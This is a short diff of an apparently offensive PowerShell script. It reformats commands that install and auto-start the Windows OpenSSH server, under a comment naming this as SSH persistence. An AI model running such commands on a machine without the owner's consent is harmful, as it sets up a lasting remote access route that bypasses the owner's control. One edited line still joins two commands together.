@@ -71,7 +71,9 @@ $initial_dir = Get-Location
 
 
 #enabling  the presistance ssh 
-Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 Start-Service sshd Set-Service  -Name sshd -StartupType 'Automatic' Get-NetFirewallRule -Name *ssh* 
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 
+Start-Service sshd 
+Set-Service  -Name sshd -StartupType 'Automatic' Get-NetFirewallRule -Name *ssh* 
 
 
 #goto temp ,make working directory
